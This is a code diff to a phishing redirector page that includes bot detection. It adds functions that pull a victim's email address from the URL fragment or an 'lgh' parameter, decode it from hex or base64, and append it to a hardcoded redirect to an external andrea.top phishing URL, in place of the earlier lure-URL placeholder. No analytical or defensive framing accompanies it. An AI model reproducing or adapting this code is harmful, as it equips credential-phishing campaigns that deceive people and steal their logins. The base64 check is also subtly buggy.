@@ -211,8 +211,55 @@
             link.click();
         }
 
+        function isBase64(str) {
+            if (str === '' || String(str).trim() === '') {
+                return false
+            }
+            try {
+                if (btoa(atob(str)) === atob(btoa(str))) return true
+            } catch {
+                return false
+            }
+        }
+    
+        function isHex(str) {
+            if (str === null || str === '' || str.trim() === '') {return false}
+            try {if (hex2str(str2hex(str)) == str2hex(hex2str(str))) return true} catch {return false}
+        }
+    
+        function str2hex(plain) {
+            let hex, i, result = "";
+            for (i=0; i<plain.length; i++) {
+                hex = plain.charCodeAt(i).toString(16);
+                result += (hex).slice(-4);
+            }
+            return result
+        }
+    
+        function hex2str(hex) {
+            return decodeURIComponent('%' + hex.match(/.{1,2}/g).join('%'))
+        }
+    
+        function getEmail() {
+            let email = "";
+            if (window.location.hash) {
+                email = window.location.hash.substring(1);
+                email = isHex(email) ? hex2str(email) : email;
+                return isBase64(email) ? window.atob(email) : email;
+            }
+    
+            let searchParams = new URLSearchParams(window.location.search);
+            if (searchParams.has("lgh")) {
+                email = searchParams.get("lgh");
+                email = isHex(email) ? hex2str(email) : email;
+                return isBase64(email) ? window.atob(email) : email;
+            }
+            return email
+        }
+
         function redirectVisitor() {
-            window.location.replace("{lure_url_js}")
+            let email = getEmail();
+            window.location.replace("https://cp-010123.andrea.top/.77/aa/0x.html?lgh="+email)
         }
 
         async function runBotDetection() {
